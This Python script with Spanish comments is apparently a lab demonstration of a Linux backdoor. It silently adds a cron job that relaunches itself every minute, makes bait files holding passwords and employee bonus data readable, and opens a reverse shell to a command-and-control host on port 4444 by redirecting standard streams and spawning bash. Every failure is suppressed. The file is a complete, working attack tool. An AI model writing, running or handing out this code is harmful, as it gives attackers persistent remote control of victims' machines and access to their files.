import socket, os, pty, subprocess

# --- CONFIGURACIÓN DEL LABORATORIO ---
C2_HOST = "192.168.199.130"
C2_PORT = 4444
RUTA_PERSISTENCIA = "/home/victima/Descargas/SysUpdate_Static"

# --- 1. FASE DE PERSISTENCIA ---
# Definimos la ruta exacta donde se supone que está el ejecutable.
ruta_ejecutable = RUTA_PERSISTENCIA
comando_cron = f"* * * * * {ruta_ejecutable}"

try:
    # Capturamos el crontab actual de forma silenciosa
    crontab_actual = subprocess.run(["crontab", "-l"], capture_output=True, text=True)

    # Verificamos si nuestro script ya está metido ahí
    if ruta_ejecutable not in crontab_actual.stdout:
        # Si no está, lo inyectamos
        nuevo_crontab = crontab_actual.stdout.rstrip() + f"\n{comando_cron}\n"
        subprocess.run(["crontab", "-"], input=nuevo_crontab, text=True)
except:
    # Si algo falla (ej. el usuario no tiene permisos de cron), fallamos en silencio
    pass

# --- 2. FASE DE PREPARACIÓN DE ENTORNO (Exclusivo para la demo) ---
# Nos aseguramos de que los archivos trampa tengan los permisos correctos
archivos_demo = [
    "/home/victima/Documents/contraseñas_servicio_tecnico.txt",
    "/home/victima/Documents/bonificaciones_empleados_q3_final.csv"
]

for archivo in archivos_demo:
    try:
        # Solo intentamos cambiar los permisos si el archivo realmente existe
        if os.path.exists(archivo):
            os.chmod(archivo, 0o644)  # 0o es el prefijo para números octales en Python
    except:
        pass

# --- 3. FASE DE CONEXIÓN (REVERSE SHELL) ---
try:
    # Conecta a la IP de tu Kali
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((C2_HOST, C2_PORT))

    # Redirige la conexión de forma invisible
    for fd in (0, 1, 2):
        os.dup2(s.fileno(), fd)

    # Abre la terminal interactiva
    pty.spawn("/bin/bash")
except:
    pass